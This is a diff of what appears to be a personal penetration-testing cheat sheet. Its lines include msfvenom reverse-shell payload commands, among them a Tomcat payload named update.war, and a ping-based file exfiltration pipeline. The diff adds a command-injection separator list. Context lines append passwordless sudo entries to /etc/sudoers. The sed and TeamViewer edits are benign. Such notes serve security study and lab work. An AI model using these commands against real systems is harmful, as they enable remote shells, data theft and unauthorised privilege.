@@ -312,28 +312,8 @@ $ nmap -p25 --script smtp-enum-users $ip
 
  /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63
 
-## sed
 
-
-```console
-
-# garder seulement le texte entre <pre> text </pre>
-sed 's/<pre>/<pre>\n/g' 
-sed -n '/<xxxxx/,/<\/xxxxx/p'
-sed -n '/<div id="footer"/,/<\/div/p'
-# delete @ at the begining of lines
-sed 's/^@\(.*\)/\1/' 
-# Supprimer toutes les balises
-sed -e 's/<[^>]*>//g'
-sed 's/<\/\?[^>]\+>//g'
-# Supprimer la première ligne et la dernière ligne
-sed -r -e '1d' -e '$d' -e 's/^\s+//'
-# Supprimer tout sauf entre 2 balises
-sed '/<div class="content">/,/<\/div>/!d'
-sed -n '/<div class="content">/,/<\/div/p'
-```
-
-curl
+## curl
 
 Tar file
     # create
@@ -925,6 +905,7 @@ https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev &>/dev/null
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -a x64 --platform linux -f elf -o rev
     msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.110.1 LPORT=4444 -f elf -a x86 -o rev
+    #Payload options (linux/x86/meterpreter/reverse_tcp):
 
     #Tomcat
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.1 LPORT=1234 -f war > update.war
@@ -1745,6 +1726,20 @@ print input11
 ```
 
 
+# Command injection
+
+    ;
+    &
+    &&
+    |
+    ||
+    ;
+    0x0a, \n
+    `command`
+    $(command)
+    ; command ;
+    ;; command ;;
+    Test with basic commands : pwd, ls, netcat, ssh, wget, ping, traceroute, cat, nc, cd, touch, echo, rm, mv
 
 # Buffers overflow
 
@@ -1795,3 +1790,10 @@ tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q
 
     echo "blumbergh ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
     echo "peter ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+
+
+# teamviewer
+
+
+https://askubuntu.com/questions/1322937/ubuntu-20-04-shows-a-black-screen-when-connecting-through-teamviewer-but-i-stil
